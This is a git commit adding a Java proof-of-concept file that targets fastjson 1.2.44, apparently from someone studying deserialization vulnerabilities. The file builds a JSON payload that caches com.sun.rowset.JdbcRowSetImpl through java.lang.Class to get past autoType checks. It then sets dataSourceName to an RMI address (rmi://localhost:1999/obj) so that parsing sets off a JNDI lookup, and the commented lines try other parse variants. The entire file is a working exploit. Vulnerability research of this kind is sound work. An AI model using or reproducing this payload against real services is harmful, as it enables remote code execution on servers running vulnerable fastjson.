48103b34e3fc8756893856cdd62c7845e91385b1
m10112 <515576486@qq.com>
2025-02-26 14:40:51 +0800

    ...

---
+++ fastjson1.2.44/src/main/java/org/example/TestCacheJdbcRowSetImpl.java
@@ -0,0 +1,17 @@
+package org.example;
+
+import com.alibaba.fastjson.JSON;
+
+public class TestCacheJdbcRowSetImpl {
+    public static void main(String[] args) {
+        String fastSer = "{ \"A\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}, \"B\": {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\",\"autoCommit\":\"true\"} }";
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+        JSON.parseObject(fastSer);
+//        JSON.parseObject(fastSer,Object.class);
+//        JSON.parseObject(fastSer, Serializable.class);
+//        JSON.parseObject(fastSer, Wrapper.class);
+//        JSON.parseObject(fastSer, JdbcRowSet.class);
+//        JSON.parseObject(fastSer, BaseRowSet.class);
+//        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class);
+    }
+}
